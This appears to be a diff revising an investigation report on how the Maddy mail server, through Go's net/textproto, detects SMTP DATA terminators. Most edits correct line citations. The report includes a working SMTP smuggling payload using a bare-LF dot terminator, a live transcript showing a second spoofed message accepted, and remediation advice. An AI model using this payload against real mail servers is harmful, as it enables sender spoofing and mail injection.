@@ -20,7 +20,7 @@ Every claim in this document is traced to specific source code locations and val
 
 The critical architectural finding is that **Maddy itself contains no custom DATA boundary logic**. The entire boundary detection chain is delegated through a series of layers, each wrapping the one below:
 
-```
+```text
 Raw TCP bytes
   │
   ▼
@@ -53,7 +53,7 @@ prepareBody() → delivery         ← Parses headers, buffers body, delivers
 
 The DATA boundary detection is implemented as a 6-state finite state machine inside Go 1.13's `net/textproto` package. The implementation resides in the `dotReader.Read()` method.
 
-**Source: Go 1.13 `net/textproto/reader.go:311-393`**
+**Source: Go 1.13 `net/textproto/reader.go:311-396`**
 
 The six states are defined as integer constants (lines 316-321):
 
@@ -73,31 +73,31 @@ The complete transition table, derived from the switch statement at lines 334-38
 | Current State | Input Byte | Next State | Output | Line |
 |---|---|---|---|---|
 | `stateBeginLine` | `'.'` (0x2E) | `stateDot` | *(none — dot consumed)* | 335-337 |
-| `stateBeginLine` | `'\r'` (0x0D) | `stateCR` | *(none — CR buffered)* | 338-340 |
-| `stateBeginLine` | `'\n'` (0x0A) | `stateData`→`stateBeginLine` | `'\n'` (0x0A) | 343, 385-387 |
+| `stateBeginLine` | `'\r'` (0x0D) | `stateCR` | *(none — CR buffered)* | 339-341 |
+| `stateBeginLine` | `'\n'` (0x0A) | `stateData` | `'\n'` (0x0A) | 343, 386-387 |
 | `stateBeginLine` | other | `stateData` | the byte itself | 343 |
 | `stateDot` | `'\r'` (0x0D) | `stateDotCR` | *(none — CR buffered)* | 346-348 |
-| `stateDot` | `'\n'` (0x0A) | **`stateEOF`** | *(none — EOF)* | 349-351 |
-| `stateDot` | other | `stateData` | the byte itself | 353 |
-| `stateDotCR` | `'\n'` (0x0A) | **`stateEOF`** | *(none — EOF)* | 356-358 |
-| `stateDotCR` | other | `stateData` | `'\r'` (0x0D) | 361-362 |
-| `stateCR` | `'\n'` (0x0A) | `stateBeginLine` | `'\n'` (0x0A) | 365-367 |
-| `stateCR` | other | `stateData` | `'\r'` (0x0D) | 370-371 |
-| `stateData` | `'\r'` (0x0D) | `stateCR` | *(none — CR buffered)* | 374-376 |
-| `stateData` | `'\n'` (0x0A) | `stateBeginLine` | `'\n'` (0x0A) | 377-378 |
-| `stateData` | other | `stateData` | the byte itself | 379 |
+| `stateDot` | `'\n'` (0x0A) | **`stateEOF`** | *(none — EOF)* | 350-352 |
+| `stateDot` | other | `stateData` | the byte itself | 354 |
+| `stateDotCR` | `'\n'` (0x0A) | **`stateEOF`** | *(none — EOF)* | 357-359 |
+| `stateDotCR` | other | `stateData` | `'\r'` (0x0D) | 363-365 |
+| `stateCR` | `'\n'` (0x0A) | `stateBeginLine` | `'\n'` (0x0A) | 368-370 |
+| `stateCR` | other | `stateData` | `'\r'` (0x0D) | 373-375 |
+| `stateData` | `'\r'` (0x0D) | `stateCR` | *(none — CR buffered)* | 378-380 |
+| `stateData` | `'\n'` (0x0A) | `stateBeginLine` | `'\n'` (0x0A) | 382-383 |
+| `stateData` | other | `stateData` | the byte itself | 386-387 |
 
 **Key behaviors embedded in this table:**
 
-1. **CRLF-to-LF normalization**: When a `\r\n` pair is encountered (stateCR + `\n`), only `\n` is emitted. The `\r` is absorbed. This happens at lines 365-367.
+1. **CRLF-to-LF normalization**: When a `\r\n` pair is encountered (stateCR + `\n`), only `\n` is emitted. The `\r` is absorbed. This happens at lines 368-370.
 
-2. **Bare LF acceptance**: A bare `\n` from `stateData` (line 377-378) transitions directly to `stateBeginLine`, treating it as a valid line ending — even though RFC 5321 requires `\r\n`.
+2. **Bare LF acceptance**: A bare `\n` from `stateData` (lines 382-383) transitions directly to `stateBeginLine`, treating it as a valid line ending — even though RFC 5321 requires `\r\n`.
 
 3. **Dot-unstuffing**: When a dot appears at the beginning of a line followed by another character (not `\r` or `\n`), the leading dot is consumed (the `continue` at line 337 skips output), and the following character is emitted directly. This means lines beginning with `..` in the wire format become `.` in the output.
 
 4. **Two paths to EOF**: The state machine reaches `stateEOF` via two distinct transitions:
-   - `stateDot` + `\n` → `stateEOF` (line 350): bare LF after dot
-   - `stateDotCR` + `\n` → `stateEOF` (line 357): CRLF after dot
+   - `stateDot` + `\n` → `stateEOF` (lines 350-352): bare LF after dot
+   - `stateDotCR` + `\n` → `stateEOF` (lines 357-359): CRLF after dot
 
 ### 2.3 Mermaid State Diagram
 
@@ -127,9 +127,9 @@ stateDiagram-v2
     stateEOF --> [*] : io.EOF returned
 ```
 
-**Note on the `stateBeginLine` + `\n` transition**: When a bare `\n` is read from `stateBeginLine`, the code at line 343 sets `d.state = stateData` and falls through to the output. However, this byte then enters the output buffer, and since it equals `\n`, the `stateData` case at line 377-378 would apply on the *next* iteration. In practice, the bare `\n` from `stateBeginLine` outputs `\n` and enters `stateData`, then the subsequent character is processed from `stateData`. The net effect: a bare `\n` at `stateBeginLine` produces a `\n` output and the state transitions to `stateData`, which will transition back to `stateBeginLine` on the next `\n` or via `\r\n`.
+**Note on the `stateBeginLine` + `\n` transition**: When a bare `\n` is read from `stateBeginLine`, the code at line 343 sets `d.state = stateData` and falls through to the output at lines 386-387. The immediate next state is `stateData` — Go's `switch` does not fall through by default, so the `stateData` case (lines 377-384) is not executed in this iteration. On the *subsequent* iteration, a following `\n` or `\r\n` in the `stateData` case (lines 382-383) will transition back to `stateBeginLine`. The net effect: a bare `\n` at `stateBeginLine` produces a `\n` output and transitions to `stateData`.
 
-**Source: Go 1.13 `net/textproto/reader.go:311-393`**
+**Source: Go 1.13 `net/textproto/reader.go:311-396`**
 
 ### 2.4 Accepted Terminator Variants
 
@@ -152,7 +152,7 @@ The complete code path from the DATA SMTP command to delivered message:
 
 When the SMTP client sends `DATA\r\n`, the go-smtp connection handler dispatches to `handleData()`:
 
-```
+```text
 go-smtp/server.go:139-151  — handleConn() main loop reads commands
 go-smtp/conn.go:88-136     — handle() dispatches "DATA" to handleData()
 ```
@@ -225,6 +225,8 @@ func (s *Session) prepareBody(ctx context.Context, r io.Reader) (textproto.Heade
 }
 ```
 
+> **Note**: The `textproto.ReadHeader()` call above uses `github.com/emersion/go-message/textproto` (for MIME header parsing), not Go's standard library `net/textproto` (which provides the DotReader). These are two distinct packages with the same short name `textproto`. Throughout this document, `textproto.DotReader()` refers to Go's `net/textproto`, while `textproto.ReadHeader()` and `textproto.Header` refer to `go-message/textproto`.
+
 **Step 6: io.Copy drain ensures clean state transition**
 
 After `Session.Data()` returns, go-smtp executes:
@@ -240,7 +242,7 @@ io.Copy(ioutil.Discard, r) // Source: go-smtp/conn.go:521
 ```go
 c.reset()  // Source: go-smtp/conn.go:512 (deferred)
 // reset() calls session.Reset(), clears fromReceived and recipients
-// Source: go-smtp/conn.go:693-700
+// Source: go-smtp/conn.go:694-703
 ```
 
 The `handleData()` function returns, and `handleConn()` loops back to read the next SMTP command at `go-smtp/server.go:139-148`.
@@ -284,7 +286,7 @@ sequenceDiagram
 
 Four identical message payloads were sent to a live go-smtp server (built from Maddy's exact dependency versions), differing **only** in the DATA terminator sequence. All payloads used identical headers and body text:
 
-```
+```text
 Headers: From: sender@example.com\r\nSubject: Test\r\n\r\n
 Body: Hello World
 ```
@@ -317,7 +319,7 @@ Payloads were sent using raw TCP sockets (Python `socket` module) to avoid any c
 
 All four variants produced **byte-identical** delivered bodies (52 bytes):
 
-```
+```hex
 00000000  46 72 6f 6d 3a 20 73 65  6e 64 65 72 40 65 78 61  |From: sender@exa|
 00000010  6d 70 6c 65 2e 63 6f 6d  0a 53 75 62 6a 65 63 74  |mple.com.Subject|
 00000020  3a 20 54 65 73 74 0a 0a  48 65 6c 6c 6f 20 57 6f  |: Test..Hello Wo|
@@ -326,7 +328,7 @@ All four variants produced **byte-identical** delivered bodies (52 bytes):
 
 Decoded as text (with `\n` shown explicitly):
 
-```
+```text
 From: sender@example.com\n
 Subject: Test\n
 \n
@@ -339,12 +341,12 @@ Hello World\n
 
 The wire payload for Variant 1 (standard) contained these hex bytes for the headers:
 
-```
+```hex
 Input:  46 72 6f 6d 3a ... 6f 6d 0d 0a 53 75 62 ...  (0d 0a = \r\n)
 Output: 46 72 6f 6d 3a ... 6f 6d 0a 53 75 62 ...      (0a = \n only)
 ```
 
-This normalization is performed by the `stateCR` → `stateBeginLine` transition at **`net/textproto/reader.go:365-367`**:
+This normalization is performed by the `stateCR` → `stateBeginLine` transition at **`net/textproto/reader.go:368-370`**:
 
 ```go
 case stateCR:
@@ -392,7 +394,7 @@ SMTP smuggling exploits a difference in how two SMTP servers interpret the DATA 
 
 **Attack payload structure**:
 
-```
+```text
 EHLO test.example.com\r\n
 MAIL FROM:<sender@example.com>\r\n
 RCPT TO:<victim@example.com>\r\n
@@ -401,10 +403,10 @@ From: sender@example.com\r\n
 Subject: Legitimate\r\n
 \r\n
 This is the body\n.\n          ← bare-LF dot terminator
-MAIL FROM:<attacker@evil.com>\r\n   ← smuggled command
+MAIL FROM:<attacker@evil.example.com>\r\n   ← smuggled command
 RCPT TO:<victim@example.com>\r\n    ← smuggled command
 DATA\r\n                            ← smuggled DATA
-From: attacker@evil.com\r\n         ← smuggled message
+From: attacker@evil.example.com\r\n         ← smuggled message
 Subject: Smuggled!\r\n
 \r\n
 This is a smuggled message\r\n
@@ -416,7 +418,7 @@ QUIT\r\n
 
 The following is the actual protocol transcript captured by sending the attack payload to a live go-smtp server via raw TCP:
 
-```
+```text
 S: 220 localhost ESMTP Service Ready
 C: EHLO test.example.com
 S: 250-Hello test.example.com
@@ -432,7 +434,7 @@ C: DATA
 S: 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
 C: [SMUGGLING PAYLOAD: 219 bytes — body + \n.\n + smuggled commands]
 S: 250 2.0.0 OK: queued              ← Message #1 accepted (legitimate)
-S: 250 2.0.0 Roger, accepting mail from <attacker@evil.com>  ← SMUGGLED MAIL FROM
+S: 250 2.0.0 Roger, accepting mail from <attacker@evil.example.com>  ← SMUGGLED MAIL FROM
 S: 250 2.0.0 I'll make sure <victim@example.com> gets this   ← SMUGGLED RCPT TO
 S: 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>  ← SMUGGLED DATA
 S: 250 2.0.0 OK: queued              ← Message #2 accepted (SMUGGLED!)
@@ -442,7 +444,7 @@ S: 221 2.0.0 Goodnight and good luck  ← QUIT processed
 **Server-side message capture** confirmed two distinct delivered messages:
 
 **Message #1** (legitimate):
-```
+```text
 From: sender@example.com
 To: [victim@example.com]
 Body (63 bytes):
@@ -453,11 +455,11 @@ Body (63 bytes):
 ```
 
 **Message #2** (smuggled):
-```
-From: attacker@evil.com
+```text
+From: attacker@evil.example.com
 To: [victim@example.com]
 Body (71 bytes):
-  From: attacker@evil.com\n
+  From: attacker@evil.example.com\n
   Subject: Smuggled!\n
   \n
   This is a smuggled message\n
@@ -512,7 +514,7 @@ The smuggling attack is exploitable when ALL of the following conditions are met
 
 **Why Maddy cannot fix this:**
 
-The lenient behavior is embedded in Go's standard library (`net/textproto/reader.go:349-351`), which is compiled into the Go runtime. Maddy's code never sees the raw wire bytes — by the time `Session.Data(r)` is called, the DotReader has already consumed and interpreted the terminator. To enforce strict RFC 5321 boundary detection, one would need to either:
+The lenient behavior is embedded in Go's standard library (`net/textproto/reader.go:350-352`), which is compiled into the Go runtime. Maddy's code never sees the raw wire bytes — by the time `Session.Data(r)` is called, the DotReader has already consumed and interpreted the terminator. To enforce strict RFC 5321 boundary detection, one would need to either:
 
 1. Patch Go's standard library `net/textproto` package
 2. Modify go-smtp to use a custom DotReader instead of `textproto.DotReader()`
@@ -520,7 +522,7 @@ The lenient behavior is embedded in Go's standard library (`net/textproto/reader
 
 None of these options are available through Maddy's configuration. The behavior is a property of the Go runtime version, not of Maddy's code.
 
-**Source: go-smtp/conn.go:498-526 (handleData), Go 1.13 net/textproto/reader.go:349-351 (stateDot + `\n` → stateEOF)**
+**Source: go-smtp/conn.go:498-526 (handleData), Go 1.13 net/textproto/reader.go:350-352 (stateDot + `\n` → stateEOF)**
 
 ---
 
@@ -532,7 +534,7 @@ None of these options are available through Maddy's configuration. The behavior 
 
 **Protocol transcript excerpt:**
 
-```
+```text
 C: EHLO timing.test
 S: 250-Hello timing.test [...capabilities...]
 [repeat 12 times:]
@@ -612,13 +614,13 @@ A "strict proxy" is defined as an SMTP relay or load balancer that:
 
 **Scenario**: Client sends a message with `\n.\n` terminator through a strict proxy to Maddy:
 
-```
+```text
 Client → Strict Proxy → Maddy
 
 Client sends:
   DATA\r\n
   From: sender@example.com\r\n\r\nBody text\n.\n
-  MAIL FROM:<attacker@evil.com>\r\n
+  MAIL FROM:<attacker@evil.example.com>\r\n
   ...
   .\r\n
   QUIT\r\n
@@ -647,7 +649,7 @@ Maddy sees (after proxy forwards raw bytes):
 
 A "normalizing proxy" converts all bare LF bytes to CRLF before forwarding:
 
-```
+```text
 Client → Normalizing Proxy → Maddy
 
 Client sends:
@@ -712,7 +714,7 @@ if c.server.Debug != nil {
 
 Example debug output for a standard DATA transaction:
 
-```
+```text
 220 localhost ESMTP Service Ready
 EHLO test.example.com
 250-Hello test.example.com
@@ -749,7 +751,7 @@ s.log.Msg("accepted", "msg_id", s.msgMeta.ID)
 
 This produces a log entry like:
 
-```
+```text
 accepted msg_id=<generated-uuid>
 ```
 
@@ -782,7 +784,7 @@ The following information is **not present** in any log output, despite being po
 
 If the TCP connection drops mid-DATA:
 - The DotReader's `br.ReadByte()` returns an error (typically `io.EOF` or a net.Error)
-- The DotReader converts `io.EOF` to `io.ErrUnexpectedEOF` (line 330-331) to distinguish premature EOF from normal EOF
+- The DotReader converts `io.EOF` to `io.ErrUnexpectedEOF` (lines 328-329) to distinguish premature EOF from normal EOF
 - Maddy's `prepareBody()` propagates this error, causing `Session.Data()` to return an error
 - The `io.Copy(ioutil.Discard, r)` drain at `go-smtp/conn.go:521` reads the same error and returns
 - go-smtp's `handleData()` writes an error response, but if the connection is already broken, the write fails silently
@@ -825,7 +827,7 @@ If `delivery.Commit()` fails at line 330:
 
 | Investigation Area | Key Finding | Evidence |
 |---|---|---|
-| **Boundary Decision Mechanics** | The DotReader is a 6-state FSM in Go's stdlib that accepts 4 terminator variants including bare-LF | State machine at `net/textproto/reader.go:311-393`; runtime test confirms all 4 produce `250 OK` |
+| **Boundary Decision Mechanics** | The DotReader is a 6-state FSM in Go's stdlib that accepts 4 terminator variants including bare-LF | State machine at `net/textproto/reader.go:311-396`; runtime test confirms all 4 produce `250 OK` |
 | **Payload Comparison** | All 4 variants produce byte-identical delivered bodies with bare-LF line endings | Hex dumps show 52 identical bytes across all variants; CRLF→LF normalization confirmed |
 | **Smuggling Risk** | **Confirmed exploitable**: bare-LF dot terminator causes Maddy to process smuggled commands | Runtime test delivered 2 messages from 1 DATA phase; protocol transcript captured |
 | **Pipelining Consistency** | Zero wobble: 0.011 ms standard deviation across 12 messages; mega-pipeline works correctly | Timing data shows min 0.096ms, max 0.135ms; 12/12 mega-pipeline messages delivered |
@@ -855,7 +857,7 @@ Based on the evidence gathered in this investigation:
 
 3. **For security auditors**: When assessing Maddy deployments, check the entire path from the internet to Maddy for bare-LF handling. The risk exists only when there is a parsing differential between upstream and downstream components.
 
-4. **For message integrity**: Be aware that all CRLF sequences in message bodies are silently normalized to bare LF by the DotReader. DKIM body hash computation and Content-Length headers may be affected. Source: `net/textproto/reader.go:365-367` (CRLF→LF normalization in stateCR transition).
+4. **For message integrity**: Be aware that all CRLF sequences in message bodies are silently normalized to bare LF by the DotReader. DKIM body hash computation and Content-Length headers may be affected. Source: `net/textproto/reader.go:368-370` (CRLF→LF normalization in stateCR transition).
 
 ---
 
